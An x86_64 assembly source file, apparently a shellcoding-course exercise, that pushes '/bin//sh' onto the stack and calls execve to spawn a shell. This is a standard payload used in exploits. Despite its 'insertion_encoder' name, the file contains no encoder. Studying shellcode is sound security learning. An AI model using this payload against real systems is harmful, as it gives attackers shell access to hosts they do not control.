; David @InfinitelyManic
; code inspired by http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
; 037_insertion_encoder.s
;
section .bss
section .data
        filename:       db      "/bin//sh"
section .text
        global _start
_start:
        ; <syscall name="execve" number="59"/>
        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        ; x86_64                 rdi                   rsi                 rdx          r10 r8 r9
        ;
        ; man execve provides, in part:
        ; On Linux, argv and envp can be specified as NULL.
        ; In both cases, this has the same effect as specifying the argument as a pointer to a list containing a single null pointer.
        ; Do not take advantage of this nonstandard and nonportable misfeature!
        ;

        xor rax, rax                            ; nulls
        push rax                                ; push 8 bytes of 0x00

        ; we need /bin//sh in hex in reverse order if we are placing onto to the stack
        ; rev <<< "/bin//sh" | xxd -g8
        ; 00000000: 68732f2f6e69622f 0a                hs//nib/.

        ; for stack based shellcode; caution: stack clobbering at work
        mov rbx, 0x68732f2f6e69622f     ; hs//nib/
        push rbx                        ; push 8 bytes of hs//nib/ onto stack

        mov rdi, rsp                    ; _filename = 47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  47 '/'  115 's' 104 'h'

        ; argv is an array of argument strings passed to the new program.
        ; By convention, the first of these strings should contain the filename associated with the file being executed. i.e., filename, nulls...
        push rax                        ; 0x0000000000000000
        push rdi                        ; 47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  47 '/'  115 's' 104 'h'
        mov rsi, rsp                    ; argv[] = array of argument strings  = _filename == 47 '/'  98 'b'  105 'i' 110 'n' 47 '/'  47 '/'  115 's' 104 'h', 0x0000000000000000

        push rax                        ; 0x000000000000000
        mov rdx, rsp                    ; envp[] = array of strings == null

        add rax, 59                     ; syscall # re execve
        syscall

